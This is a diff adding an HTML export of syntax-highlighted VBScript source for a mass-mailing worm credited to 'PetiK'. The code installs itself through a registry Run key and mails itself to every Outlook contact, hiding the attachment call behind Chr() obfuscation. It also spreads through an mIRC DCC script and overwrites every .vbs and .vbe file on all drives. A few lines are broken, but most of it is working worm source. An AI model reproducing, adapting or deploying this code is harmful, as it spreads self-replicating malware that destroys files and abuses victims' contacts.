@@ -1,0 +1,141 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+.sc10 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'Vbs.Vbswg.EMM Worm Created By PetiK. 10/27/2009
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Q45128E4</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">Q67UU0N6</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Q45128E4.getspecialfolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">C5IIJSHJ</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Q67UU0N6</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.jpg.vbs"</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">G706F251</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"wscript.shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">G706F251.regwrite</span><span class="sc0"> </span><span class="sc4">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"wscript.exe "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">C5IIJSHJ</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" %"</span><span class="sc0">
+</span><span class="sc7">Q45128E4.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">C5IIJSHJ</span><span class="sc0">
+</span><span class="sc7">AD38R7SA</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">G706F251.regread</span><span class="sc6">(</span><span class="sc4">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\EMM Worm\AC8Q63KC"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">M5K4PN0P</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">G706F251.regread</span><span class="sc6">(</span><span class="sc4">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\EMM Worm\FE6CE6PL"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">JN178GF3</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">M5K4PN0P</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">QT1S5M60</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">QT1S5M60</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">NHU2J927</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">QT1S5M60.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">NNN82NRN</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">NHU2J927.AddressLists</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">C2C6GI54</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">NNN82NRN</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">C2C6GI54.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">LO8TLPP2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">C2C6GI54.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">OJ524RLF</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">LO8TLPP2</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">QA313IE3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">QT1S5M60.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">MRD9IK84</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">C2C6GI54.AddressEntries</span><span class="sc6">(</span><span class="sc7">OJ524RLF</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">QA313IE3.To</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">MRD9IK84.Address</span><span class="sc0">
+</span><span class="sc7">QA313IE3.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Very Important!"</span><span class="sc0">
+</span><span class="sc7">QA313IE3.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Hi:"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbcrlf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Please view this file, it's very important."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbcrlf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">execute</span><span class="sc0"> </span><span class="sc4">"set FJ76ECJP =QA313IE3."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">65</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">116</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">116</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">97</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">99</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">104</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">109</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">101</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">110</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">116</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">115</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">KL83UFGG</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">C5IIJSHJ</span><span class="sc0">
+</span><span class="sc7">QA313IE3.DeleteAfterSubmit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">FJ76ECJP.Add</span><span class="sc0"> </span><span class="sc7">KL83UFGG</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">QA313IE3.To</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">QA313IE3.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">function</span><span class="sc0">
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">JN178GF3</span><span class="sc6">(</span><span class="sc7">CJCQC6G7</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">CJCQC6G7</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">VL1G76R2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">G706F251.regread</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Q45128E4.fileexists</span><span class="sc6">(</span><span class="sc4">"c:\mirc\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">CJCQC6G7</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"c:\mirc"</span><span class="sc0">
+</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">Q45128E4.fileexists</span><span class="sc6">(</span><span class="sc4">"c:\mirc32\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">CJCQC6G7</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"c:\mirc32"</span><span class="sc0">
+</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">Q45128E4.fileexists</span><span class="sc6">(</span><span class="sc7">VL1G76R2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">CJCQC6G7</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">VL1G76R2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc"</span><span class="sc0">
+</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">Q45128E4.fileexists</span><span class="sc6">(</span><span class="sc7">VL1G76R2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc32\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">CJCQC6G7</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">VL1G76R2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc"</span><span class="sc0">
+</span><span class="sc3">Else</span><span class="sc0">
+</span><span class="sc7">CJCQC6G7</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">CJCQC6G7</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Q45128E4.CreateTextFile</span><span class="sc6">(</span><span class="sc7">CJCQC6G7</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\script.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"[script]"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"n0=on 1:JOIN:#:{"</span><span class="sc0">
+</span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"n0=on 1:JOIN:#:{"</span><span class="sc0">
+</span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"n1=  /if ( $nick == $me ) { halt }"</span><span class="sc0">
+</span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"n2=  /."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">100</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">99</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">99</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" send $nick "</span><span class="sc0">
+</span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">C5IIJSHJ</span><span class="sc0">
+</span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">A90B7L3J</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"n3=}"</span><span class="sc0">
+</span><span class="sc7">script.Close</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">L5845128</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">EM31EEJ7</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Q45128E4.Drives</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">I9A706F2</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">EM31EEJ7</span><span class="sc0">
+</span><span class="sc7">QE867UU0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">I9A706F2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" \ "</span><span class="sc0">
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">N5T5IIJS</span><span class="sc6">(</span><span class="sc7">QE867UU0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">N5T5IIJS</span><span class="sc6">(</span><span class="sc7">HUND38R7</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">SPBC8Q63</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HUND38R7</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">KV15K4PN</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Q45128E4.GetFolder</span><span class="sc6">(</span><span class="sc7">SPBC8Q63</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">I5HE6CE6</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">KV15K4PN.Files</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">P3HN178G</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">I5HE6CE6</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">lcase</span><span class="sc6">(</span><span class="sc7">P3HN178G.Name</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"mirc.ini"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">JN178GF3</span><span class="sc6">(</span><span class="sc7">P3HN178G.ParentFolder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Q45128E4.GetExtensionName</span><span class="sc6">(</span><span class="sc7">P3HN178G.path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"vbs"</span><span class="sc0">
+</span><span class="sc7">Q45128E4.CopyFile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc7">P3HN178G.path</span><span class="sc6">,</span><span class="sc3">true</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Q45128E4.GetExtensionName</span><span class="sc6">(</span><span class="sc7">P3HN178G.path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"vbe"</span><span class="sc0">
+</span><span class="sc7">Q45128E4.CopyFile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc7">P3HN178G.path</span><span class="sc6">,</span><span class="sc3">true</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">FD1T1S5M</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">KV15K4PN.Subfolders</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">F08HU2J9</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">FD1T1S5M</span><span class="sc0">
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">F08HU2J9.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">function</span><span class="sc0">
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">AD38R7SA</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Randomize</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">G706F251.regwrite</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"</span><span class="sc6">,</span><span class="sc4">"PetiK"</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">function</span><span class="sc0">
+</span><span class="sc1">'Vbswg 2 Beta. By [K]
+</span></div></body>
+</html>
